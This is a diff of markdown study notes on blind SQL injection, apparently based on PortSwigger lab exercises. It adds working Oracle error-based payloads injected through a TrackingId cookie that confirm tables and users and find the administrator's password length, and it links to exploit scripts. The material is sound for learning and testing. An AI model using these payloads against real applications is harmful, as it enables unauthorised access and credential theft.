@@ -65,7 +65,7 @@ We can continue this process to systematically determine the full password for t
 
 **Note:** The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
-See [SQLi_blind_triggering_conditional_resposes_exploit.py](SQLi_blind_triggering_conditional_resposes_exploit.py) for an example of script that performs a blind SQL injection.
+See [SQLi_blind_triggering_conditional_responses_exploit.py](SQLi_blind_triggering_conditional_responses_exploit.py) for an example of script that performs a blind SQL injection.
 
 ## Inducing conditional responses by triggering SQL errors
 
@@ -84,4 +84,25 @@ Using this technique, we can retrieve data in the way already described, by syst
 
 	xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
 
-<!-- non sono riuscito a fare il test, non so perché non andava... -->
+See [SQLi_blind_triggering_conditional_responses_through_errors_exploit.py](SQLi_blind_triggering_conditional_responses_through_errors_exploit.py) for an example of script that performs a blind SQL injection inducing conditional responses by triggering SQL errors.
+
+**Useful tips**:
+
+- Checking if the table users exists (in Oracle DB):
+	
+	`TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
+
+	As this query does not return an error, you can infer that this table does exist. Note that the `WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation. 
+
+
+- Test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:
+	
+	`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+	
+	Verify that the condition is true (the error is received), confirming that there is a user called administrator.
+
+- Determine how many characters are in the password of the administrator user. To do this, change the value to:
+
+	`TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+	This condition should be true, confirming that the password is greater than 1 character in length. We can iterate this query increasing the length of the password and we will find the lenght of the administrator's password when we will no longer get an error from the server.
